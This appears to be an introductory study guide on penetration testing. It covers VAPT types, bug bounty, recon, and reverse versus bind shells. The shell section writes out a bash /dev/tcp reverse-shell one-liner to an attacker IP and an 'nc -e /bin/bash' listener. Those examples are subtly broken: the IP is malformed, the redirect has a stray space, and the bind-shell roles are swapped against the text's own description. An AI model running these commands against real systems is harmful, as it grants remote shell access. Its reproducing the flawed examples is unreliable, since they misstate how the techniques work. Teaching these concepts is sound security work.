# What is Penetration Testing?

Penetration testing is a cybersecurity process where ethical hackers test a computer system, website, or network by trying to attack it in a safe and legal way. The goal is to find security weaknesses, such as bugs, weak passwords, or misconfigurations, before real hackers can exploit them. It helps organizations improve their security and protect their data and systems from cyberattacks.

# Who is Pentesters?

Pen testers, or penetration testers, are cybersecurity professionals who legally and ethically try to hack computer systems, networks, or applications to find security weaknesses. They act like real attackers to discover vulnerabilities before cybercriminals do. Their job is to test security, report the problems they find, and suggest ways to fix them to help keep systems and data safe.

# Types of Pentesting Techniques

## Black Box Testing: 

Black Box Testing is a type of penetration testing where the tester has no prior knowledge about the target system, such as its source code, internal structure, or passwords. The tester behaves like an external hacker and tries to find vulnerabilities by interacting with the system from the outside. The main goal is to see how secure the system is against real-world attacks from unknown attackers.

## White Box Testing: 

White Box Testing is a type of penetration testing where the tester has complete knowledge of the target system, including source code, network details, passwords, and system architecture. This helps the tester thoroughly examine the system and identify hidden security weaknesses more efficiently. It is mainly used to perform deep security analysis and improve overall system protection.

## Gray Box Testing:

Gray Box Testing is a type of penetration testing where the tester has partial knowledge or limited access to the target system, such as a user account or some internal information. It combines both Black Box and White Box testing methods. This approach helps simulate attacks from insiders or users with limited privileges and is useful for finding security weaknesses that may not be visible from the outside.

# What exactly Gets Tested in a Pentest?

## 1. Network Security Pen testers check:

Internal and external networks

Firewalls, routers, and switches

Open ports, running services, and configurations

## 2. Web and Mobile Applications They test:

Vulnerabilities like SQL Injection and XSS

API security

Login systems, access control, sessions, and encryption

## 3. System and Host Security They examine:

Servers and computers

Operating system vulnerabilities

Misconfigurations and missing security updates (patches)

## 4. Wireless Networks They check:

Wi-Fi encryption strength

Unauthorized access points

Signal range and coverage weaknesses

## 5. Physical Security They test:

Physical access to sensitive areas or servers

Device security and social engineering attempts

## 6. Social Engineering They test employees using:

Phishing and spear-phishing attacks

Awareness and response to cyberattacks

## 7. Cloud Security They examine:

Cloud infrastructure misconfigurations

Access permissions and cloud data protection


# What is Vulnerability Assessment?

A Vulnerability Assessment is the process of identifying, analyzing, and listing security weaknesses in a computer system, network, application, or organization. It helps find problems such as outdated software, weak passwords, missing security patches, and misconfigurations that could be exploited by attackers. Unlike penetration testing, a vulnerability assessment mainly focuses on detecting and reporting vulnerabilities rather than actively exploiting them. The main goal is to help organizations understand their security risks and fix weaknesses before hackers can use them.


# Difference in VA and PT

|Vulnerability Assessment (VA)|Penetration Testing (PT)|
|---|---|
|Finds and lists security vulnerabilities|Actively tries to exploit vulnerabilities|
|Mostly automated scanning|Manual + automated testing|
|Identifies possible weaknesses|Tests whether weaknesses can actually be exploited|
|Focuses on detection|Focuses on real-world attack simulation|
|Gives a list of risks and fixes|Shows impact of an actual attack|
|Safer and less intrusive|More aggressive testing|
|Done regularly for monitoring|Done periodically for deep security testing|

# What is VAPT?

VAPT, which stands for Vulnerability Assessment and Penetration Testing, is a cybersecurity process used to find and test security weaknesses in computer systems, networks, websites, or applications. In this process, vulnerability assessment identifies possible security flaws such as weak passwords, outdated software, or misconfigurations, while penetration testing safely attempts to exploit those weaknesses to understand how harmful they could be in a real cyberattack. The main purpose of VAPT is to help organizations improve security and protect their systems from hackers by finding and fixing vulnerabilities before they can be misused.

# Difference between VAPT & Bug Bounty?

|VAPT|Bug Bounty|
|---|---|
|Conducted by hired security professionals or companies|Open to ethical hackers from around the world|
|Done within a fixed scope and time|Continuous testing over a long period|
|Organization pays a fixed cost for testing|Hackers are rewarded only if they find valid bugs|
|Includes both vulnerability assessment and penetration testing|Mainly focused on finding exploitable security bugs|
|Usually private and controlled|Can be public or private|
|Follows a planned testing methodology|Hackers use their own testing approaches|
|Provides detailed security reports and recommendations|Reports specific vulnerabilities found|

# What is Manual Testing?

Manual testing is a software testing process where a tester checks an application or system by manually performing actions and observing how it behaves, without using automated tools or scripts. The tester interacts with the software like a real user to find bugs, errors, security issues, or usability problems. In cybersecurity and penetration testing, manual testing involves security experts manually examining systems and trying different attack techniques to discover vulnerabilities that automated scanners may miss.

# What is Automation Testing?

Automation testing is a software testing method where tools, scripts, or programs are used to automatically test an application or system without much human involvement. Instead of manually checking every feature, automated tests run predefined test cases to quickly find bugs, errors, or security issues. It helps save time, improves accuracy, and is especially useful for repetitive tasks and large applications. In cybersecurity, automation testing can include automated vulnerability scanners and security testing tools that quickly identify common security weaknesses.

# Web Penetration Testing

Web penetration testing is a security assessment where ethical hackers test a website or web application by simulating real cyberattacks. The goal is to find vulnerabilities such as SQL Injection, Cross-Site Scripting (XSS), broken authentication, insecure configurations, and other OWASP Top 10 issues that attackers could use to gain unauthorized access or steal data.

# API Penetration Testing

API penetration testing focuses on testing APIs (Application Programming Interfaces) to identify security weaknesses in how data is processed and shared. Testers check for issues like weak authentication, authorization flaws, poor input validation, and exposure of sensitive information to ensure attackers cannot misuse the API.

# Network Penetration Testing

Network penetration testing is the process of testing an organization’s network infrastructure for security vulnerabilities. It includes examining internal and external networks, routers, switches, firewalls, and servers to identify weaknesses that attackers could exploit to gain access to systems or data.

## Types of Network VAPT-

|Internal VAPT|External VAPT|
|---|---|
|Tests the organization’s internal network|Tests internet-facing systems|
|Simulates attacks from inside the organization|Simulates attacks from outside attackers|
|Assumes attacker already has network access|Assumes attacker has no internal access|
|Focuses on internal systems, employees, and devices|Focuses on websites, servers, firewalls, and public services|
|Finds weaknesses inside the company network|Finds vulnerabilities exposed to the internet|
|Helps detect insider threats|Helps prevent external cyberattacks|

### Internal VAPT- 

Internal Vulnerability Assessment and Penetration Testing (VAPT) focuses on testing the security of an organization’s internal network infrastructure. It simulates attacks from inside the organization, such as a malicious employee or an attacker who has already gained access to the network. The goal is to identify and exploit vulnerabilities within internal systems, devices, and services.

### External VAPT-

External VAPT (Vulnerability Assessment and Penetration Testing) is a security testing process used to identify and test vulnerabilities in an organization’s internet-facing systems, such as websites, web applications, servers, firewalls, APIs, and other public-facing infrastructure. It simulates real-world attacks from external hackers who try to gain unauthorized access from outside the organization’s network. The main goal of External VAPT is to discover security weaknesses that attackers could exploit and help organizations fix them before a real cyberattack happens.

# Reverse Shell

A reverse shell is when the target machine connects back to the attacker’s machine.
### How it works:

1. Attacker starts a listener on their machine (waiting for a connection).
2. Target machine runs a command that connects out to the attacker.
3. Once connected, the attacker gets a shell on the target.

### Why it's used:

- Works well when the target is behind a firewall/NAT (outgoing connections are usually allowed).
- Common in penetration testing and real-world attacks.

**Example:** 
```
Attacker - nc -lnvp 4444
Victim - bash -c 'bash -i > & /dev/tcp/192168.1.5/4444 0>&1'
```

# Bind Shell

A bind shell is when the target machine opens a port and waits for the attacker to connect.

### How it works:

1. Target machine opens a listening port.
2. Attacker connects to that port.
3. Attacker gets shell access.

### Why it's less common:

- Requires the target’s firewall to allow incoming connections.
- Easier to detect and block.

**Example:** 
```
Attacker - nc -lnvp 4444 -e /bin/bash
Victim - nc 127.0.0.1 4444
```

|Feature|Reverse Shell|Bind Shell|
|---|---|---|
|Connection|Target connects to attacker|Attacker connects to target|
|Firewall|Bypasses many firewalls|Often blocked by firewalls|
|Setup|Attacker listens|Target listens|
|Stealth|More stealthy|Less stealthy|

# What is Reconnaissance?

In cybersecurity and penetration testing, reconnaissance (recon) is the process of gathering information about a target before attempting any attack or security assessment. It is the first phase of ethical hacking and helps identify details such as IP addresses, domains, open ports, running services, technologies, vulnerabilities, and network structure. Recon can be passive, where information is collected without directly interacting with the target, or active, where the tester interacts with the system through techniques like port scanning and service enumeration. The main purpose of recon is to understand the target environment, map the attack surface, and identify potential weaknesses that can be tested further during a penetration test.

## Active Recon:

Active reconnaissance (active recon) is the process of gathering information about a target by directly interacting with its systems, networks, or applications. In this method, the attacker or penetration tester sends requests or probes to the target to discover details such as open ports, running services, operating systems, network structure, and possible vulnerabilities. Common active recon techniques include port scanning, ping sweeps, banner grabbing, and vulnerability scanning using tools like Nmap and Wireshark. Unlike passive recon, active recon can usually be detected by firewalls, intrusion detection systems, or server logs because the target system is being directly contacted.

## Passive Recon:

Passive reconnaissance (passive recon) is the process of gathering information about a target without directly interacting with its systems or network. The goal is to collect publicly available information while remaining unnoticed. In passive recon, attackers or penetration testers use sources such as search engines, social media, public records, DNS information, WHOIS databases, job postings, and leaked data to learn about the target’s infrastructure, technologies, employees, domains, and email addresses. Since there is no direct communication with the target system, passive recon is difficult to detect and is commonly used as the first step in penetration testing and ethical hacking.